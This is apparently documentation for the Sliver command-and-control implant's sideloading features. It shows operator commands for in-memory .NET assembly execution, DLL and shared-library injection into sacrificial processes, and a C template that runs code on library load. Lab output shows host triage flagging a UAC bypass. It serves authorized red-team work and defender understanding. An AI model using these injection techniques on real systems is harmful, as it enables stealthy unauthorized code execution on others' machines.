## Sideloading Features

Sliver implants support three different ways of loading third party tools:

- `execute-assembly`
- `sideload`
- `spawndll`

## Known Limitations

Arguments passed to .NET assemblies and non-reflective PE extensions are limited to 256 characters. This is due to a limitation in the Donut loader Sliver is using. A workaround for .NET assemblies is to execute them in-process, using the `--in-process` flag, or a custom BOF extension like `inline-execute-assembly`. There is currently no workaround for non-reflective PE extension.

## Loading .NET Assemblies

This feature is only supported on Windows.

Using `execute-assembly`, one can run an arbitrary .NET assembly on a remote system via a Sliver implant. The implant will start a sacrificial process (`notepad.exe` by default, you can change this by using the `--process`) that will host a reflective DLL used to load the .NET CLR. The assembly will then be copied into this process and a new thread will start on the reflective DLL entrypoint, which will load and run the assembly in memory.

Here's an example with [Seatbelt](https://github.com/GhostPack/Seatbelt):

```
sliver (CONCRETE_STEEL) > execute-assembly -t 80 /tmp/Seatbelt.exe All
[*] Assembly output:

                        %&&@@@&&
                        &&&&&&&%%%,                       #&&@@@@@@%%%%%%###############%
                        &%&   %&%%                        &////(((&%%%%%#%################//((((###%%%%%%%%%%%%%%%
%%%%%%%%%%%######%%%#%%####%  &%%**#                      @////(((&%%%%%%######################(((((((((((((((((((
#%#%%%%%%%#######%#%%#######  %&%,,,,,,,,,,,,,,,,         @////(((&%%%%%#%#####################(((((((((((((((((((
#%#%%%%%%#####%%#%#%%#######  %%%,,,,,,  ,,.   ,,         @////(((&%%%%%%%######################(#(((#(#((((((((((
#####%%%####################  &%%......  ...   ..         @////(((&%%%%%%%###############%######((#(#(####((((((((
#######%##########%#########  %%%......  ...   ..         @////(((&%%%%%#########################(#(#######((#####
###%##%%####################  &%%...............          @////(((&%%%%%%%%##############%#######(#########((#####
#####%######################  %%%..                       @////(((&%%%%%%%################
                        &%&   %%%%%      Seatbelt         %////(((&%%%%%%%%#############*
                        &%%&&&%%%%%        v0.2.0         ,(((&%%%%%%%%%%%%%%%%%,
                         #%%%%##,

=== Running System Triage Checks ===

=== Basic OS Information ===

  Hostname                      :  DESKTOP-0QQJ4JL
  Domain Name                   :
  Username                      :  DESKTOP-0QQJ4JL\lab
  ProductName                   :  Windows 10 Pro
  EditionID                     :  Professional
  ReleaseId                     :  1909
  BuildBranch                   :  19h1_release
  CurrentMajorVersionNumber     :  10
  CurrentVersion                :  6.3
  Architecture                  :  AMD64
  ProcessorCount                :  2
  IsVirtualMachine              :  True
  BootTime (approx)             :  5/19/2020 8:55:55 AM
  HighIntegrity                 :  False
  IsLocalAdmin                  :  True
    [*] In medium integrity but user is a local administrator- UAC can be bypassed.
...
```

## Shared Library Side Loading

The `sideload` command allows to load and run code in-memory (Windows/Linux) or via dropping a temporary file to disk (MacOS). On Windows, the DLL will be converted to a shellcode via [sRDI](https://github.com/monoxgas/sRDI) and injected into a sacrificial process.

On Linux systems, Sliver uses the `LD_PRELOAD` technique to preload a shared library previously written in a memory file descriptor using the `memfd_create` syscall. That way, no file is stored on disk, which grants the implant a bit of stealth. The shared library is preloaded in a sacrificial process, which is `/bin/ls` by default.

On MacOS systems, Sliver uses the `DYLD_INSERT_LIBRARIES` environment variable to preload a dynamic library into a program, chosen by the operator. The target program must allow unsigned libraries to be loaded that way.

No specific operation is performed by Sliver for Linux and Mac OS shared libraries, which means it's up to the operator to build their shared libraries to execute whenever they see fit. A good starting point would be using the `constructor` attribute for MacOS shared libraries, or adding a `.init_array` section for the Linux version.

Sliver will use the `LD_PARAMS` environment variable to pass arguments to the sideloaded libraries. Thus, the library can just read this environment variable to retrieve parameters and act accordingly.

Here's a starting point :

```c
#if __linux__
#include <stdlib.h>

void DoStuff();

static void init(int argc, char **argv, char **envp)
{
    // unset LD_PRELOAD to prevent sub processes from misbehaving
    unsetenv("LD_PRELOAD");
    // retrieve the LD_PARAMS value
    // unset LD_PARAMS if there's no need for it anymore
    unsetenv("LD_PARAMS");
    DoStuff();
}
__attribute__((section(".init_array"), used)) static typeof(init) *init_p = init;
#elif __APPLE__
void DoStuff();

__attribute__((constructor)) static void init(int argc, char **argv, char **envp)
{
    // unset DYLD_INSERT_LIBRARIES to prevent sub processes from misbehaving
    unsetenv("DYLD_INSERT_LIBRARIES");
    // retrieve the LD_PARAMS value
    // unset LD_PARAMS if there's no need for it anymore
    unsetenv("LD_PARAMS");
    DoStuff();
}

#endif
```

Don't forget to unset the `LD_PRELOAD` or `DYLD_INSERT_LIBRARIES` environment variables, otherwise any sub process started by your shared library or host process will be preloaded with your shared library.

To side load a shared library, use the `sideload` command like this:

```
// Windows example
sliver (CONCRETE_STEEL) > sideload -e ChromeDump /tmp/chrome-dump.dll
// Linux example
sliver (CONCRETE_STEEL) > sideload -p /bin/bash -a "My arguments" /tmp/mylib.so
// MacOS example
sliver (CONCRETE_STEEL) > sideload -p /Applications/Safari.app/Contents/MacOS/SafariForWebKitDevelopment -a 'Hello World' /tmp/mylib.dylib
```

Please be aware that you need to specify the entrypoint to execute for Windows DLLs.

## Loading Reflective DLLs

Loading reflective DLLs is just a special case of side loading DLLs. To make things easier, the `spawndll` command allows you to inject reflective DLLs and run them in a remote process.

Here's an example with the `PsC` tool from [Outflank's Ps-Tools suite](https://github.com/outflanknl/Ps-Tools):

```
sliver (CONCRETE_STEEL) > spawndll /tmp/Outflank-PsC.dll blah
[*] Output:

--------------------------------------------------------------------
[+] ProcessName:         svchost.exe
    ProcessID:   2960
    PPID:        576 (services.exe)
    CreateTime:  19/05/2020 10:53
    Path:        C:\Windows\System32\svchost.exe
    ImageType:   64-bit
    CompanyName:         Microsoft Corporation
    Description:         Host Process for Windows Services
    Version:     10.0.18362.1

<-> Session:     TCP
    State:       ESTABLISHED
    Local Addr:  172.16.241.128:49819
    Remote Addr:         40.67.251.132:443

--------------------------------------------------------------------
[+] ProcessName:         CONCRETE_STEEL.exe
    ProcessID:   7400
    PPID:        5440 (explorer.exe)
    CreateTime:  19/05/2020 10:54
    SessionID:   1
    Path:        C:\Users\lab\Desktop\CONCRETE_STEEL.exe
    ImageType:   64-bit
    UserName:    DESKTOP-0QQJ4JL\lab
    Integrity:   Medium
    PEB Address:         0x0000000000352000
    ImagePath:   C:\Users\lab\Desktop\CONCRETE_STEEL.exe
    CommandLine:         "C:\Users\lab\Desktop\CONCRETE_STEEL.exe"

<-> Session:     TCP
    State:       ESTABLISHED
    Local Addr:  172.16.241.128:49687
    Remote Addr:         172.16.241.1:8888
```

Note that in this case, the entrypoint of the reflective DLL (`ReflectiveLoader`) expects a non NULL parameter, which is why we passed a dummy parameter `blah`.
